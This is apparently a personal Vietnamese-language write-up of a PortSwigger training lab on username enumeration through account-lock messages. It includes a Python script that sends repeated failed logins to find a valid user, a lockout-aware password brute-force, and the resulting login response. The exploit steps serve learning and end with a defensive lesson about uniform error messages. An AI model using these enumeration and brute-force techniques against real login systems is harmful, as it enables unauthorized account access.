
-lab này: https://0af400490383f08b81568952005e0027.web-security-academy.net/
-title mình thấy khi vào là `Username enumeration via account lock`

> [!NOTE]
> -link lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock

### hướng giải
- [ ] mình thử login `carlos:test` 7 lần liên tục, sau đó quan sát gói tin trả về, mình thấy toàn báo `Invalid username or password.` chứ không bị lock gì cả
- [ ] => nên mình đoán `carlos` không phải username đúng của instance này. Username đúng là 1 user khác trong list mẫu
- [ ] mình nhớ lý thuyết: chỉ username đúng mới bị lock (server mới đếm số lần sai để lock), còn username sai thì server không thèm đếm
- [ ] nên mình sẽ brute username, mỗi username thử sai 5 lần, thằng nào báo `too many incorrect login attempts` thì thằng đó đúng

### giải
-bước 1: mình lấy list username mẫu của portswigger (tầm 100 user: carlos, root, admin, test...), rồi chạy script thử mỗi user 5 lần:
```python
import requests, re
base = "https://0af400490383f08b81568952005e0027.web-security-academy.net"
s = requests.Session()
s.get(base + "/login")
for u in usernames:
    for i in range(5):
        r = s.post(base + "/login", data={"username":u,"password":"wrongtest123"})
    # sau khi quan sát gói tin này, mình thấy chỉ user đúng mới báo lock ở lần 4-5
```
-kết quả:
```
miss carlos -> last: Invalid username or password.
miss root -> last: Invalid username or password.
...
HIT: user -> ['Invalid username or password.', 'Invalid username or password.', 'Invalid username or password.', 'You have made too many incorrect login attempts. Please try again in 1 minute(s).', ...]
```
![[auth-account-lock-enum.png]]
-> nên mình chốt username đúng là `user`, chứ không phải `carlos` như mọi khi.

-bước 2: brute password của `user`. Khó ở chỗ cứ sai 3 lần là bị lock 1 phút, nên mình phải brute chậm: sai -> đợi 65s -> thử lại. Mình để ý 1 điểm rất hay:
- sai thường -> `200` + `Invalid username or password.`
- bị lock -> `200` + `You have made too many incorrect login attempts...`
- còn password `baseball` thì trả về `200` mà **không có câu báo lỗi nào cả**
-> sau khi quan sát gói tin này, mình thấy `baseball` khác hẳn mọi password khác, đúng như solution PortSwigger mô tả (response đúng thì không chứa error message). Nên mình nghi `baseball` chính là password, nhưng lúc đó account đang bị lock nên chưa redirect.

-bước 3: mình dừng hết brute, đợi sạch 2 phút không đụng gì, rồi thử đúng 1 phát:
```
POST /login
username=user&password=baseball
```
-sau khi quan sát gói tin trả về này, mình thấy:
```
HTTP/1.1 302 Found
Location: /my-account?id=user
Set-Cookie: session=UlpMOGklNkishYF6L3PQPyGCtTG3dDQ6
```
-> trúng! Để đối chiếu, mình thử `user:wrongcontrol123` thì vẫn `200` + `Invalid username or password.` bình thường.

-bước 4: mình GET theo redirect:
```
GET /my-account?id=user
-> 200 OK, body có: <p>Your username is: user</p>
```
![[auth-account-lock-solved.png]]
-> là solve lab.

> [!NOTE]
> -mẹo của mình: lúc brute mà thấy response nào không có warning gì thì note lại ngay, đó chính là password đúng đang bị lock che mất. Đợi hết lock rồi thử lại 1 phát là ra.
> -bài học của mình: account lock tưởng là bảo mật, nhưng nếu báo khác nhau giữa user đúng/sai thì lại thành chỗ để enumerate. Lẽ ra lock hay không cũng phải báo 1 câu chung chung thôi.
![[Pasted image 20261014213505.png]]
